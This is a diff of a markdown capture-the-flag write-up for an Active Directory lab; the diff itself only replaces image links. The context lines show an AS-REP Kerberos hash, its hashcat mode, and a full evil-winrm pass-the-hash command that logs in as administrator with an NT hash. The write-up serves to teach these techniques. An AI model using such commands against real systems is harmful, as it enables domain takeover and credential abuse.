@@ -135,7 +135,8 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7bb613fbc20d5367449e918e59b8d469$8d0f563
 ```
 
 Let's look at: https://hashcat.net/wiki/doku.php?id=example_hashes to figure out what hash we have.
-![[Pasted image 20250521052015.png]]
+![Pasted image 20250521052015](https://github.com/user-attachments/assets/a787e9bb-3a99-435d-a4f0-2f65de5aa81c)
+
 `Kerberos 5, etype 23, AS-REP`
 `18200`
 
@@ -280,5 +281,6 @@ ATTACKTIVEDIREC$:des-cbc-md5:01c2070468329eda
 We can perform a ==pass the hash== attack using the administrator hash. I will be using ==Evil-WinRM==
 
 `evil-winrm -i 10.10.171.16 -u administrator -H 0e0363213e37b94221497260b0bcb4fc `
-![[Pasted image 20250521055928.png]]
+![Pasted image 20250521055928](https://github.com/user-attachments/assets/11a3df01-e4ac-4db8-afe7-d133bcc0c9aa)
+
 Easy flag!
